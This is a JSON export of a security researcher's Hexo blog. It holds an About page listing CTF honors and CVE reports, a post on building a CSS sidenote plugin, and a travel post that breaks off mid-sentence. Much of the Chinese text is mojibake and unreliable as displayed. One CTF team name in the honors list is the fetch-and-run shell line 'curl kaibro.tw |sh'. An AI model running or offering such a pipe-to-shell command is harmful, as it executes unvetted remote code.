{"meta":{"title":"NiNi's den","subtitle":"Hi, I'm NiNi","description":null,"author":"Terrynini","url":"http://blog.terrynini.tw","root":"/"},"pages":[{"title":"About","date":"2017-07-22T07:40:16.000Z","updated":"2023-07-03T15:33:59.000Z","comments":true,"path":"about/index.html","permalink":"http://blog.terrynini.tw/about/index.html","excerpt":"","text":"About MeTingYu Chen, aka terrynini38514, major in Cyber Security, member of Balsn, love CTF and everything about computer science. Interests Reverse Engineering Binary Exploitation Fuzzer Development Red Team Cryptography HonorsContest Pwn2Own Toronto 2022, Master of Pwn Dec 9th, 2022 International CTFPlay in Balsn DEFCON 28 CTF Finals, 3rd place (HITCONâš”Balsn) Online, Aug. 2020 DEFCON 27 CTF Finals, 2nd place (HITCONâš”BFKinesiS) Las Vegas, USA, Aug. 2019 DEFCON 26 CTF Finals, 12th place (BFS) Las Vegas, USA, Aug. 2018 â€¦ Solo Flare-on 8 Finisher #96 (#1 in Taiwan) Online, 2021-11-29 11:21 Flare-on 7 Finisher #177 (#2 in Taiwan) Online, 2020-10-21 10:16 Flare-on 6 Finisher #290 (#8 in Taiwan) Online, 2019-09-27 06:05 Reversing.kr Finisher #26 Online, 2018-08-04 19:58 Play in DoubleSigma DefCamp CTF Finals, 5th place Bucharest, Romania, Nov. 2018 HITCON CTF Finals, 12th place Taipei, Taiwan, Nov. 2017 Domestic CTF AEGIS Finals, 6th place (Virtual Fox) Nangang, Taiwan, Nov. 2020 é‡‘ç›¾ç Finals, å¶„éœ²é ­è§’ç (ankleboy&amp;banana) Taipei, Taiwan, Nov. 2020 AEGIS Finals, 3rd place (DoubleSigma) Taipei, Taiwan, Sep. 2019 é‡‘ç›¾ç Finals, 1st place (curl kaibro.tw |sh) Taipei, Taiwan, Nov. 2019 AIS3 EOF Finals, 1st place (DoubeSigma) Taipei, Taiwan, Jan. 2019 é‡‘ç›¾ç Finals, é‹’èŠ’ç•¢éœ²ç (DoubleSigma) Taipei, Taiwan, Oct. 2018 AEGIS Finals, 6th place Taipei, Taiwan, Oct. 2018 AIS3 Finals, 3rd place Taipei, Taiwan, Oct. 2018 AIS3 EOF Finals, 1st place (DoubleSigma_Ethereum) Taipei, Taiwan, Feb. 2018 NTC&#x2F;NCTU&#x2F;NTUST ç¨‹å¼å®‰å…¨ Final CTF, 1st place Online, Dec. 2017 é‡‘ç›¾ç Finals, æ½›åŠ›ç„¡çª®ç (DoubleSigma) Taipei, Taiwan, Dec. 2017 é‡‘ç›¾ç Finalist (AHQ) Taipei, Taiwan, Nov. 2016 PortfolioVulnerability Reports CVE-2023-32154 - RCE, pre-auth WAN RCE of MikroTik RouterOS CVE-2022-46308 - BAC, able to update&#x2F;remove all users CVE-2022-46307 - BAC, able to control door remotely CVE-2021-3648 (duplicated QQ) - nm-new, CWE-835 Infinite Loop ZD-2021-00727 ZD-2020-00737 ZD-2020-00342 Contributions radareorg&#x2F;radare2 - Fix zignature mask from `zj` is differ from `z` (#17180) AFLplusplus&#x2F;AFLplusplus - remove redundant unsetenv (#947) Certifications Offensive Security Certified Professional (OSCP) Feb. 2021 - PRESENT JLPT N3 Mar. 2021 - PRESENT Presentation AIS3 2019: Firmware security analysis Jul. 30, 2019 ISIP Summer Camp: é€†å‘å·¥ç¨‹ Jul. 22, 2020 ISIP Summer Camp: é€†å‘å·¥ç¨‹ Jul. 16-17, 2019 ISIP Winter Camp: PWN-åˆ¥pwné‚£è£¡ Dec. 16, 2018 ISIP Winter Camp: é€†å‘å·¥ç¨‹-é€†é€†ï¼å¿è¡“ï¼æ²’æœ‰F5ä¹‹è¡“ Dec. 15, 2018 è‡ºç£å¥½å²é§­åŸ¹è¨“èª²ç¨‹: Attack&amp;Defence ç¶“é©—åˆ†äº« Aug. 25, 2018 ISIP Summer Camp: é€†å‘å·¥ç¨‹&#x2F;PWN Jul. 19, 2018 ISIP Summer Camp: é€†å‘å·¥ç¨‹ Jul. 18, 2018 ISIP Winter Camp: å¾ç¨‹å¼ debug+reverse åˆ° PWN æ¶æ——å¤§è³½ Jan. 31, 2018 Educations M. S., Graduate Degree Program of Cyber Security, NYCU Sep. 2019 - Jul. 2021 Bachelor of Science, in Computer Science, NCU Sep. 2015 - Jun. 2019 National Wu-Ling Senior High School Aug. 2012 - Jun. 2015 Experience Security Researcher, DEVCORE May. 2022 - PRESENT Information Technology Intern, Mediatek Jul. 2019 - Aug. 2019 Part-time MIS, Health Center, NCU Jan. 2016 - Jun. 2019 Part-time MIS, Network Systems Division, Computer Center, NCU Jan. 2016 - Jun. 2017"},{"title":"Categories","date":"2017-07-22T07:40:16.000Z","updated":"2017-11-07T08:07:05.000Z","comments":true,"path":"categories/index.html","permalink":"http://blog.terrynini.tw/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2017-07-22T07:21:34.000Z","updated":"2017-07-22T08:36:13.000Z","comments":true,"path":"tags/index.html","permalink":"http://blog.terrynini.tw/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2024::å¹«éƒ¨è½æ ¼å¢åŠ è¨»é‡‹çš„åŠŸèƒ½ï¼","slug":"2024-å¹«éƒ¨è½æ ¼å¢åŠ è¨»é‡‹çš„åŠŸèƒ½ï¼","date":"2024-06-22T17:00:23.000Z","updated":"2024-06-22T18:01:07.974Z","comments":true,"path":"tw/2024-å¹«éƒ¨è½æ ¼å¢åŠ è¨»é‡‹çš„åŠŸèƒ½ï¼/","permalink":"http://blog.terrynini.tw/tw/2024-%E5%B9%AB%E9%83%A8%E8%90%BD%E6%A0%BC%E5%A2%9E%E5%8A%A0%E8%A8%BB%E9%87%8B%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%81/","excerpt":"å¿™äº†ä¸€æ®µæ™‚é–“éƒ½æ²’æœ‰å¥½å¥½ç¶­è­·éƒ¨è½æ ¼ï¼Œé™¤äº†è³‡æ–™æœ‰é»èˆŠä¹‹å¤–ï¼Œæ›äº†é›»è…¦æ‰ç™¼ç¾ Hexo ç‰ˆæœ¬è¶…ç´šèˆŠè·‘ä»€éº¼æ±è¥¿éƒ½æœƒè¸©åˆ°ä¸€å † Bugã€‚è€Œä¸”æ­£å¥½ä¸€ç›´æœ‰ä¸€å€‹å¾ˆæƒ³åšçš„åŠŸèƒ½ï¼šåœ¨æ–‡ç« æ—é‚Šé¡¯ç¤ºè¨»è§£ï¼æ­£å¥½æœ‰é»æ™‚é–“ï¼Œå°±é †ä¾¿åšå®Œäº†ï¼Œå¤§æ¦‚ç´€éŒ„ä¸€ä¸‹é€™å€‹åŠŸèƒ½æ˜¯æ€éº¼å¯¦ä½œçš„ä¹‹å¤–ï¼Œç¢ºå¯¦ä¹Ÿéœ€è¦ä¸€ç¯‡æ–‡ç« ä¾†æ¸¬è©¦ä¸€ä¸‹é€™å€‹åŠŸèƒ½XDã€‚ è‡ªå·±æ„Ÿè¦ºé€™ç¯‡æ–‡ç« ç”¨é›»è…¦æ¿ä¾†çœ‹ï¼Œæ•ˆæœæ‡‰è©²æ˜¯æœ€å¥½çš„ã€‚","text":"å¿™äº†ä¸€æ®µæ™‚é–“éƒ½æ²’æœ‰å¥½å¥½ç¶­è­·éƒ¨è½æ ¼ï¼Œé™¤äº†è³‡æ–™æœ‰é»èˆŠä¹‹å¤–ï¼Œæ›äº†é›»è…¦æ‰ç™¼ç¾ Hexo ç‰ˆæœ¬è¶…ç´šèˆŠè·‘ä»€éº¼æ±è¥¿éƒ½æœƒè¸©åˆ°ä¸€å † Bugã€‚è€Œä¸”æ­£å¥½ä¸€ç›´æœ‰ä¸€å€‹å¾ˆæƒ³åšçš„åŠŸèƒ½ï¼šåœ¨æ–‡ç« æ—é‚Šé¡¯ç¤ºè¨»è§£ï¼æ­£å¥½æœ‰é»æ™‚é–“ï¼Œå°±é †ä¾¿åšå®Œäº†ï¼Œå¤§æ¦‚ç´€éŒ„ä¸€ä¸‹é€™å€‹åŠŸèƒ½æ˜¯æ€éº¼å¯¦ä½œçš„ä¹‹å¤–ï¼Œç¢ºå¯¦ä¹Ÿéœ€è¦ä¸€ç¯‡æ–‡ç« ä¾†æ¸¬è©¦ä¸€ä¸‹é€™å€‹åŠŸèƒ½XDã€‚ è‡ªå·±æ„Ÿè¦ºé€™ç¯‡æ–‡ç« ç”¨é›»è…¦æ¿ä¾†çœ‹ï¼Œæ•ˆæœæ‡‰è©²æ˜¯æœ€å¥½çš„ã€‚ ç¶²è·¯å·¡é‚ä¹‹å‰åœ¨çœ‹åˆ¥äººçš„éƒ¨è½æ ¼çš„æ™‚å€™å°±æœ‰æ³¨æ„åˆ°æœ‰äº›æ–‡ç« æœƒæœ‰ sidenote çš„æ•ˆæœï¼Œè­¬å¦‚ Secret Club å°±æœ‰éå¸¸ç°¡å–®çš„ sidenote æ ¼å¼ï¼Œè®€èµ·ä¾†å¾ˆèˆ’æœï¼Œæœ‰æ™‚å€™ä¹Ÿæœƒæœ‰ code å½¢å¼çš„å…§å®¹åŒ…åœ¨è£¡é¢ åŸºæœ¬ä¸Šéƒ½åœ¨è‹±æ–‡ç¶²ç«™çœ‹åˆ°ï¼Œä¸­æ–‡ä¸–ç•Œä¸æµè¡Œï¼Ÿ ä¹Ÿæœ‰æ¯”è¼ƒé…·ç‚«çš„ç‰ˆæœ¬ï¼Œåƒæ˜¯ DOWN TO THE WIRE é€™ç¯‡é—œæ–¼ DEFCON çš„æ–‡ç« ï¼Œæœ‰è¶£çš„åœ°æ–¹æ˜¯å®ƒçš„ sidenote å…§æ–‡æœ‰æ›´å¤šçš„ HTML tag å¯ä»¥ä½¿ç”¨ã€‚ æ‡‰è©²æ˜¯ CTF æˆ°éšŠ PPP ç›¸é—œçš„äººå¯«çš„éƒ¨è½æ ¼ å¯¦ä½œæ™‚é–“ç°¡å–®çš„ google ä¸€ä¸‹å¯ä»¥çœ‹åˆ°å¾ˆå¤šé—œæ–¼ HTML5 å¼•å…¥çš„ &lt;aside&gt; çš„è³‡è¨Šï¼Œä½†å¯¦éš›ä¸Šå»å¾ˆå°‘ç¯„ä¾‹æ˜¯ç›´æ¥ä½¿ç”¨é€™å€‹ tag ä¾†è£½ä½œ sidenoteã€‚ç›¤é»ä¸€ä¸‹å¯¦ä½œæ™‚é‡åˆ°çš„ä¸€äº›å•é¡Œï¼ˆä½¿ç”¨ Hexoï¼‰ï¼š ç›´æ¥ä½¿ç”¨ &lt;aside&gt; çš„é™åˆ¶é¦–å…ˆè¦çŸ¥é“ï¼Œ&lt;p&gt; å…§ä¸èƒ½æœ‰å€å¡Šç´šçš„å…ƒç´ ï¼Œä¸ç„¶æ®µè½æœƒè¢«è‡ªå‹•é—œé–‰ï¼Œæ‰€ä»¥ç”¨ Hexo æ’°å¯«æ–‡ç« æ™‚ï¼Œå¦‚æœç›´æ¥åœ¨çš„ markdown ä¸­é€™æ¨£å¯«çš„è©±ï¼š æˆ‘ç ´é˜²äº†ç¦æ­¢ç¦æ­¢å•Šå•Šå•Šhuhhuhhuhæ¼¬é¯Š&lt;aside&gt;ä½†æˆ‘æ€•ç—›&lt;/aside&gt;æˆ‘å°±é€™æ¨£äº†å—šå“‡å“‡å“‡å“‡å“‡ å¯¦éš›ä¸Šæœƒè¢« render æˆä¸‹é¢é€™æ¨£ï¼š æ³¨æ„åˆ°å…§æ–‡ä¸­çš„ æˆ‘å°±é€™æ¨£äº†å—šå“‡å“‡å“‡å“‡å“‡ï¼Œå› ç‚º &lt;p&gt; è¢«é—œé–‰å°è‡´å¼·ç½®æ›è¡Œä¹‹å¤–ï¼Œaside ä¹‹å¾Œçš„å…§æ–‡ä¹Ÿæ²’æœ‰è¢« &lt;p&gt; åŒ…èµ·ä¾†ï¼Œè§£æ³•ä¹Ÿå¾ˆç°¡å–®å°±æ˜¯ aside éƒ½ä¹–ä¹–æ”¾åœ¨æ­£å¥½æ›è¡Œçš„åœ°æ–¹å°±å¥½äº†ã€‚ä½†å¾ˆå¤šäººå› æ­¤æ”¹ç”¨ä¸€äº›éå€å¡Šç´šçš„å…ƒç´ ä¾†å¯¦ä½œ sidenote åŠŸèƒ½ï¼Œå¥½è™•æ˜¯åœ¨å¯« plugin çš„æ™‚å€™å¯ä»¥ç”¨ä¸€å€‹èªæ³•å®Œæˆï¼Œä¸ç”¨æ”¾å¤ªå¤šæ³¨æ„åŠ›åœ¨æ–‡ç« æœ¬èº«ä»¥å¤–çš„äº‹æƒ…ã€‚ è­¬å¦‚èªªï¼Œã€Œçœ‹çœ‹æ—é‚Šçš„ sidenote å¯«äº†ä»€éº¼ã€é€™æ®µæ–‡å­—åœ¨ç·¨è¼¯æ™‚ï¼Œå¯«èµ·ä¾†å¯èƒ½å°±æœƒæ˜¯é€™æ¨£ï¼š haha this is sidenote çœ‹çœ‹æ—é‚Šçš„ &#123;% mark &quot;haha this is sidenote&quot; %&#125; sidenote å¯«äº†ä»€éº¼ &#123;% endmark %&#125; å¦å¤–ä¸€å€‹å¥½è™•å°±æ˜¯ï¼Œå¯ä»¥ç´”ç”¨ CSS åšå‡ºå°‹æ‰¾å°æ‡‰ç‰‡æ®µçš„æ•ˆæœï¼Œç›´æ¥çœ‹çœ‹é€™å€‹éƒ¨è½æ ¼ã€‚é€™æ˜¯ä»– sidenote çš„ä¸»è¦èªæ³•ï¼ˆé€™æ˜¯ Hugo çš„å¤–æ›ï¼‰ &lt;span class=&quot;sidenote&quot;&gt;&lt;label class=&quot;sidenote-label&quot; for=&quot;&#123;&#123; .Get 1 &#125;&#125;&quot;&gt;&#123;&#123; .Get 2 &#125;&#125;&lt;/label&gt;&lt;input class=&quot;sidenote-checkbox&quot; type=&quot;checkbox&quot; id=&quot;&#123;&#123; .Get 1 &#125;&#125;&quot;&gt;&lt;/input&gt;&lt;span class=&quot;sidenote-content sidenote-&#123;&#123; .Get 0 &#125;&#125;&quot;&gt;&#123;&#123; .Inner &#125;&#125;&lt;/span&gt;&lt;/span&gt; æ³¨æ„ sidenote-label èˆ‡ sidenote-content å°±å¥½ï¼Œå› ç‚ºä»–å€‘éƒ½è¢«ç½®æ–¼ sidenote ä¹‹ä¸­ï¼Œæ‰€ä»¥ç‰¹æ•ˆå¯«èµ·ä¾†å°±æœƒå¾ˆç°¡å–®ï¼Œåªéœ€è¦ CSS å°±èƒ½æå®šã€‚ å¦‚æœæˆ‘è¦åˆ†é–‹å¯«ï¼Œæœ€å¾Œé‚„éœ€è¦å¡ä¸€äº› js è®“é‡é»å¥å­èˆ‡ sidenote å¯ä»¥æ‰¾åˆ°å½¼æ­¤ï¼Œåœ¨çŸ¥é“å°æ–¹è¢« hover æ™‚åšå‡ºä¸€äº›ç‰¹æ•ˆã€‚å‰é¢æåˆ°çš„ DOWN TO THE WIREï¼Œé›–ç„¶å¾åœ–ç‰‡ä¸Šçœ‹èµ·ä¾†ä»–çš„é‡é»å¥å­è·Ÿ sidenote ä¹‹é–“å¥½åƒä¹Ÿæœ‰åšå°æ‡‰ï¼Œä¸éå¯¦éš›ä¸Šä»–æ˜¯ä¸èƒ½äº’å‹•çš„ï¼Œåªæ˜¯ä¸€ç›´ highlight åœ¨é‚£è£¡ï¼ˆæˆ‘ä¹Ÿä¸æ˜¯å¾ˆç¢ºå®šç‚ºä»€éº¼æˆ‘è¦è®“å®ƒå‹•èµ·ä¾†å°±æ˜¯äº†ï¼Œå¯èƒ½æ¯”è¼ƒé…·ï¼Ÿå¤§æ¦‚ï¼‰ã€‚ å¦‚æœé‡é»å¥å­èˆ‡ sidenote ä¸åŒ…åœ¨ä¸€èµ·ï¼Œé‚„æ˜¯æœ‰è¾¦æ³•å¯ä»¥ç”¨ç´” CSS åšå‡ºå°‹æ‰¾å°æ‡‰ç‰‡æ®µçš„æ•ˆæœï¼Œä½†åªèƒ½æ˜¯å–®å‘çš„ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ä¸‹é¢çš„ selector ï¼Œç•¶é‡é»å¥å­è¢« hover æ™‚ï¼Œä¸‹ä¸€å€‹æ‰¾åˆ°çš„ sidenote å°±æœƒè¢«å¥—ç”¨ border-bottom çš„æ•ˆæœï¼š p:has(.sidenote-mark:hover) ~ aside &#123; border-bottom: 2px solid #f75357;&#125; ä½† CSS æ²’æœ‰ selector å¯ä»¥å°‹æ‰¾ä¸Šå€‹å…ƒç´ ï¼Œæ‰€ä»¥ç„¡æ³•åéä¾†è®“ .sidenote-mark åšå‡ºæ”¹è®Šã€‚ å¯«å€‹ Pluginå› ç‚ºæˆ‘çœŸçš„å¾ˆæƒ³åœ¨ sidenote è£¡é¢å¡ä¸€å †é¬¼æ±è¥¿ï¼Œå°±åƒä¸Šé¢é‚£å€‹å¡äº† code snippet çš„ä¸€æ¨£ï¼Œæ‰€ä»¥æˆ‘å¯«äº†å€‹ hexo çš„ pluginï¼šhexo-sidenoteï¼ˆä½†åªæœ‰æˆ‘çŸ¥é“æ€éº¼ç”¨ï¼Œå› ç‚ºå¯¦åœ¨å¯«çš„å¤ªé™½æ˜¥ï¼‰ï¼Œæˆ‘ç¾åœ¨å¯ä»¥ç”¨ä¸‹é¢èªæ³•ä¾†å¯« sidenoteï¼š &#123;% mark 5 %&#125;é€™æ˜¯ id ç‚º 5 çš„é‡é»ï¼Œå®ƒæœƒè¢«å°æ‡‰åˆ°&#123;% endmark %&#125;ã€â€¦â€¦ï¼Ÿ&#123;% sideNote 5 %&#125; id ç‚º 5 çš„ noteï¼Œæ²’éŒ¯&#123;% endsideNote %&#125; æ•ˆæœå°±æ˜¯ï¼Œé€™æ˜¯ id ç‚º 5 çš„é‡é»ï¼Œå®ƒæœƒè¢«å°æ‡‰åˆ°â€¦â€¦ï¼Ÿ id ç‚º 5 çš„ noteï¼Œæ²’éŒ¯ Future Worké›–ç„¶ä¸€ç›´ç”¨ sidenote æ„Ÿè¦ºå°å¯«ä½œä¾†è¬›å°±å¾ˆä¸å¥åº·ï¼Œå¦‚æœæœ‰å¿ƒæ‡‰è©²ç¸½æ˜¯æœ‰è¾¦æ³•å¯ä»¥æŠŠé‚£äº›å¡é€² sidenote è£¡çš„é‚£é§é¬¼æ±è¥¿å¥½å¥½çš„å¯«é€²å…§æ–‡ï¼Œä½†ï¼Œå°±çˆ½å˜›ã€‚ä½†ç¾åœ¨é€™å€‹å¤–æ›ï¼Œå®ƒæœ‰å€‹å¤§ç—…ï¼Œå°±æ˜¯é å¤ªè¿‘çš„ sidenote æœƒæŠŠå½¼æ­¤è¦†è“‹åœ¨ä¸€èµ·ï¼Œä¸çŸ¥é“æœ‰æ²’æœ‰ä»€éº¼è¼•é¬†çš„è§£æ³•å¯ä»¥è®“ä»–å€‘ä¸è¦ overlapï¼Œä½†æˆ‘æƒ³å°±â€¦â€¦å°±â€¦â€¦æ”¹å¤©å§â€¦â€¦","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://blog.terrynini.tw/tags/CSS/"},{"name":"Dev","slug":"Dev","permalink":"http://blog.terrynini.tw/tags/Dev/"}]},{"title":"2023::è‡ªç”±ç¾åˆ©å …::ä¸Šç¾šç¾Šå³½è°·ä¹‹æ—…","slug":"2023-è‡ªç”±ç¾åˆ©å …-ä¸Šç¾šç¾Šå³½è°·ä¹‹æ—…","date":"2023-08-22T14:14:06.000Z","updated":"2024-06-22T14:05:55.550Z","comments":true,"path":"tw/2023-è‡ªç”±ç¾åˆ©å …-ä¸Šç¾šç¾Šå³½è°·ä¹‹æ—…/","permalink":"http://blog.terrynini.tw/tw/2023-%E8%87%AA%E7%94%B1%E7%BE%8E%E5%88%A9%E5%A0%85-%E4%B8%8A%E7%BE%9A%E7%BE%8A%E5%B3%BD%E8%B0%B7%E4%B9%8B%E6%97%85/","excerpt":"å¥½å¥‡å¿ƒæ—ºç››çš„äººé¡æœ‰å¤ªå¤šçš„äº‹æƒ…æƒ³åšï¼Œèˆ‡å…¶è¢«éæ–¼è©³ç´°çš„è¨ˆç•«æ‰€å›°æ“¾ï¼Œä¸å¦‚å°‡è‡ªå·±æŠ•å…¥æ–¼ç•¶ä¸‹â€”â€”æƒ³åˆ°ä»€éº¼å°±åšä»€éº¼ã€‚æ–¼æ˜¯ï¼Œæˆ‘ç¾åœ¨å°±è¦ä¾†å¯«ç¯‡æ–‡ç« ã€‚ï¼ˆåœ–ç‰‡æ²’æœ‰æ­»æ‰ï¼Œåªæ˜¯å› ç‚ºæˆ‘éƒ½æ²’æœ‰å£“åœ–æ‰€ä»¥ç”¨æ‰‹æ©Ÿçœ‹å¯èƒ½æœƒè·‘åˆ° timeout è¦é‡æ–°æ•´ç†ï¼¸ï¼¤ï¼¤ï¼‰","text":"å¥½å¥‡å¿ƒæ—ºç››çš„äººé¡æœ‰å¤ªå¤šçš„äº‹æƒ…æƒ³åšï¼Œèˆ‡å…¶è¢«éæ–¼è©³ç´°çš„è¨ˆç•«æ‰€å›°æ“¾ï¼Œä¸å¦‚å°‡è‡ªå·±æŠ•å…¥æ–¼ç•¶ä¸‹â€”â€”æƒ³åˆ°ä»€éº¼å°±åšä»€éº¼ã€‚æ–¼æ˜¯ï¼Œæˆ‘ç¾åœ¨å°±è¦ä¾†å¯«ç¯‡æ–‡ç« ã€‚ï¼ˆåœ–ç‰‡æ²’æœ‰æ­»æ‰ï¼Œåªæ˜¯å› ç‚ºæˆ‘éƒ½æ²’æœ‰å£“åœ–æ‰€ä»¥ç”¨æ‰‹æ©Ÿçœ‹å¯èƒ½æœƒè·‘åˆ° timeout è¦é‡æ–°æ•´ç†ï¼¸ï¼¤ï¼¤ï¼‰ ä¸Šç¾šç¾Šå³½è°·å¾ 2018 å¹´é–‹å§‹ï¼Œæ¯å¹´é€ è¨ªæ‹‰æ–¯ç¶­åŠ æ–¯é€™å€‹ä¸æ¯›ä¹‹åœ°å·²ç¶“æˆäº†æ…£ä¾‹ã€‚æ¯æ¬¡éƒ½æœƒæ¯”è¦åŠƒçš„æ™‚é–“æ›´æ—©ä¸€é»å‡ºç™¼åˆ°è‡ªç”±ç¾åˆ©å …ï¼Œä½œç‚ºèª¿æ•´æ™‚å·®çš„ç·©è¡æ™‚é–“ã€‚ä½†èº«ç‚ºèº«å¼·é«”å£¯ã€æ—¥å¤œé¡›å€’çš„è³‡å·¥ç³»å­¸ç”Ÿï¼Œå°è±¡ä¸­æˆ‘ä¸¦æ²’æœ‰èª¿æ•´éæ™‚å·®ã€‚ä¸æ˜¯åŠå¤œå››é»èµ·åºŠåƒéº¥ç•¶å‹ï¼ˆè‡ªè²»ï¼‰ï¼Œå»é¶å ´é–‹é–‹æ§ï¼ˆè‡ªè²»ï¼‰ï¼Œå°±æ˜¯å»å¤§å³½è°·æ„Ÿå—è‡ªèº«çš„æ¸ºå°ï¼ˆè‡ªè²»ï¼‰ã€‚ æœ¬æ¬¡ä¹Ÿæ¯«ä¸ä¾‹å¤–åœ°é–‹å•Ÿäº†æ”¯ç·šä»»å‹™ï¼ˆè‡ªè²»ï¼‰ï¼Œæ­¤æ™‚æˆ‘ç”šè‡³ä¸çŸ¥é“ç”Ÿå‘½å±éšªæœ‰å¤šå±éšªï¼š ç›®çš„åœ°ç¾šç¾Šå³½è°·ï¼Œä½æ–¼ç´ç“¦éœæ—äººçš„ä¿ç•™åœ°ï¼Œè·é›¢æˆ‘å€‘ç¾åœ¨çš„ä½ç½®ç´„ 272è‹±é‡Œï¼Œä¹Ÿå°±æ˜¯ 437.741568 å…¬é‡Œï¼Œé€™å¤§æ¦‚æ˜¯å°åŒ—å¸‚åˆ°å±æ±ç¸£çš„è·é›¢ã€‚ é è¨ˆ 09:00 å‡ºç™¼ï¼Œç®—ä¸Šåƒé£¯ä¼‘æ¯çš„æ™‚é–“ï¼Œå¤§æ¦‚ 5 å°å¾Œ 14:00 æœƒåˆ°é”ã€‚å·²ç¶“é å…ˆåœ¨ç·šä¸Šè²·å¥½äº† 15:30 çš„ç¾šç¾Šå³½è°·é–€ç¥¨ï¼Œ$40&#x2F;äººã€‚çœ‹è‘—éå¸¸å®Œç¾çš„è¨ˆåŠƒï¼Œä¹Ÿä¼¼ä¹é ç¤ºè‘—ä¸å®Œç¾çš„æ™‚åˆ»å³å°‡é™è‡¨ã€‚é€™è¶Ÿæ—…é€”è‡ªé–‹å§‹çš„ç¬é–“å°±è§¸ç™¼äº†è¨±å¤šäº‹ä»¶ã€‚ é¦–å…ˆæˆ‘å€‘çš„ Tesla Model 3 è»Šä¸»æœ¬ä¾†é è¨ˆç§Ÿä¸€å° Tesla Model Y ä¾†é–‹é–‹ï¼Œä½†å› ç‚ºå„ç¨®ä¸å¯åç‹€çš„éŒ¯èª¤ï¼Œæœ€å¾Œå°è‡´åœ¨é ˜è»Šçš„æ™‚å€™ç²å¾—äº†ä¸€å°æœ¬ä¾†å°±å¤©å¤©é–‹çš„ Tesla Model 3ï¼ˆè¦æ ¼ç”šè‡³æ¯”è¼ƒå·®ï¼‰ï¼Œè€Œä¸”å› ç‚ºé ˜è»Šçš„ä½ç½®ä¸å¤ªæ˜ç¢ºï¼Œå°è‡´ä¸€èµ·å»é ˜è»Šçš„å¹¾å€‹äººåœ¨å¨å°¼æ–¯äººé…’åº—æ‰“è½‰äº†ä¸€å€‹å¤šå°æ™‚ã€‚åŒæ™‚å…¶ä»–äººæ­£åœ¨æ‚ é–’çš„é€›è‘— 711 é‚„é †ä¾¿åƒäº†å€‹éº¥ç•¶å‹ã€‚è€Œå‘½é‹çš„é½’è¼ªæŒçºŒåœ°è½‰å‹•ï¼Œç›®å‰å¤§æ¦‚å¤šè½‰äº† 180 åº¦ã€‚ åœ¨è™•ç†äº†å„ç¨®å•é¡Œå¾Œï¼Œæˆ‘å€‘çµ‚æ–¼é–‹å§‹äº†å·²ç¶“å»¶å¾Œä¸€å€‹å¤šå°æ™‚çš„æ—…ç¨‹ã€‚ä½†ï¼Œæœ€é‡è¦çš„å„€å¼æ„Ÿç¸½æ˜¯ä¸èƒ½å¿˜è¨˜ï¼Œå…ˆå­¸ä¸€ä¸‹æœ‰éŒ¢çš„ä¸­å¹´äººï¼Œæ‹å€‹æ–¹å‘ç›¤ã€‚ é‡é»æ˜¯é€™å° MACAN çš„è»Šç‰Œå°±æ˜¯ MACANï¼Œä¸çŸ¥é“è»Šä¸»èŠ±äº†å¤šå°‘ç²¾åŠ›å¼„ä¾†çš„ã€‚ ç›¸è¼ƒä¹‹ä¸‹å¹¾å¤©å¾Œæˆ‘åœ¨ Uber ä¸Šå«çš„ä¸€å° Tesla åªèƒ½å§”æ›²æ±‚å…¨ã€‚ åœ¨é§›é›¢å¸‚å€å‰å¾€ä¸€æœ›ç„¡éš›çš„è’æ¼ ä¹‹å‰ï¼Œæˆ‘çµ‚æ–¼è¿‘è·é›¢ç›®ç¹äº† Sphereï¼Œé€™å€‹å¤§å°æƒ³å¿…é€£ç¬¬å››æ¬¡å¿ç•Œå¤§æˆ°ä¸­çš„å°¾ç¸ç‰ä¹Ÿç›¸å½¢è¦‹çµ€ã€‚ é§›é€²å…¬è·¯ä¹‹å¾Œï¼Œä¸çŸ¥æ˜¯å¤©æ°£å¤ªç‡¥é‚„æ˜¯æˆ‘å€‘æ’­æ”¾çš„é¥’èˆŒæ­Œæ›²å¤ªéæ¿€æ˜‚ï¼ŒBookgin é«”å…§çš„é«˜é›„äººè¡€æ¶²å·²ç„¶æ²¸é¨°ï¼Œåœ¨å¾Œåº§åªèƒ½çœ‹åˆ°ä¸€è¼›åˆä¸€è¼›çš„è»Šè¼›å‘å¾Œæ–¹é å»ã€‚ é€£é–‹è‘— 911 çš„ Kaibro éƒ½åªèƒ½çœ‹è‘— Bookgin çš„è»Šå°¾ç‡ˆè‹¦ç¬‘è‘—ã€‚æ­¤æ™‚å¤§æ¦‚æ˜¯ä¸Šåˆ 11:43ã€‚ æ„å¤–ä¹Ÿæˆ–è¨±æ²’é€™éº¼æ„å¤–çš„æ˜¯ï¼Œé€™ç†±æ­»äººçš„å…¬è·¯ä¸ŠçœŸçš„æœ‰éå¸¸ç¬¦åˆåˆ»æ¿å°è±¡çš„é¨å£«åœ¨è¡Œé§›è‘—ã€‚åŒæ™‚æˆ‘ä¹Ÿç™¼ç¾åœ¨è»Šä¸Šæ‹ç…§çœŸçš„å¾ˆåƒè§’åº¦ï¼Œè¦ä¸å°±æ‹åˆ°çª—æ¡†ï¼Œè¦ä¸å°±æ‹åˆ°åå°„ã€‚ è©±é›–å¦‚æ­¤ï¼Œå†å¼·çƒˆçš„åå°„ä¼¼ä¹ä¹Ÿæ©è“‹ä¸äº† Kaibro å¿ƒä¸­çš„é›€èºï¼Œçœ‹ä»–ç¬‘å¾—åƒå€‹å­©å­ä¼¼çš„ã€‚ éäº†ä¸€æ®µå……æ»¿å»¢è©±èˆ‡å…«å¦çš„æ™‚é–“ä¹‹å¾Œï¼Œåˆ°äº†æˆ‘å€‘é å…ˆè¨­å®šå¥½çš„ç¬¬ä¸€å€‹åœé é»ï¼Œé€™è£¡æœ‰åŠ æ²¹ç«™è·Ÿç‰¹æ–¯æ‹‰è¶…å……ç«™ï¼Œç‚ºäº†é¿å…åœ¨å¤–é¢è¢«æ›¬æˆç™½ç—´ï¼Œæˆ‘å€‘åˆ°é™„è¿‘çš„ä¾¿åˆ©å•†åº—è£¡å¹è‘—å†·æ°£ï¼Œå–è‘—åªè¦ \\$1.29 çš„ä¾¿å®œç¾å‘³åƒåœ¾é£²æ–™ AriZona green teaï¼ˆä»¥å‰åªè¦ \\$0.99ï¼‰ã€‚ åœ¨å°ç£æ‰“åŒ…è¡Œææ™‚ï¼Œå› 